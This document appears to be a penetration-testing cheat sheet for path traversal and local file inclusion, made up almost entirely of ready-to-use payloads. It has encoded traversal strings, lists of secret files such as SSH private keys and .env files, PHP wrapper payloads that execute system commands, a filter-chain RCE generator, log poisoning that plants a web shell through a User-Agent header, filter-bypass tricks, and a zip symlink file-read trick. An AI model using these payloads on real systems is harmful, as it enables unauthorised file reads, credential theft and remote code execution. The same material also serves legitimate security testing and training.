# Path Traversal / LFI

## Basic Traversal
```
../../../etc/passwd
....//....//etc/passwd          # if ../ is stripped once
..%2f..%2f..%2fetc/passwd       # URL-encoded
..%252f..%252fetc%252fpasswd    # double URL-encoded
```

## High-Value Linux Files
```
/etc/passwd    /etc/hostname    /proc/self/environ    /proc/self/cmdline
/proc/self/maps    /home/*/.ssh/id_rsa    /home/*/.bash_history
/app/.env    /app/.git/config    /app/.git/HEAD
```

## PHP Wrappers
```
php://filter/convert.base64-encode/resource=index.php    # source disclosure
php://input                                               # POST body as include
data://text/plain,<?php system('id'); ?>                  # inline code
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
phar://uploads/evil.jpg                                   # phar deserialization
```

## PHP Filter Chain RCE
**When**: `allow_url_include` off, but LFI exists. | **Tool**: `php_filter_chain_generator.py`
```bash
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
# Outputs a php://filter/... chain that produces arbitrary PHP content
```

## Log Poisoning
```bash
# Step 1: inject PHP into access log via User-Agent
curl -A '<?php system($_GET["cmd"]); ?>' http://target/
# Step 2: include the log
# http://target/?page=../../../var/log/apache2/access.log&cmd=id
```

## Filter Bypass
| Filter | Bypass |
|---|---|
| `../` stripped | `....//`, `..%2f`, `..%252f` |
| Extension appended (`.php`) | Null byte `%00` (PHP < 5.3.4), long path truncation |
| Whitelist (`/var/www/`) | Enough `../` to escape, then traverse back |
| `.` blocked | `%2e`, `%252e` |

## Zip Symlink
```bash
# IN: target file path  OUT: zip that reads it on extraction
ln -s /etc/passwd link && zip --symlinks payload.zip link
# Upload payload.zip — server extracts, "link" resolves to /etc/passwd
```

## Windows
```
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5c
C:\windows\win.ini
```
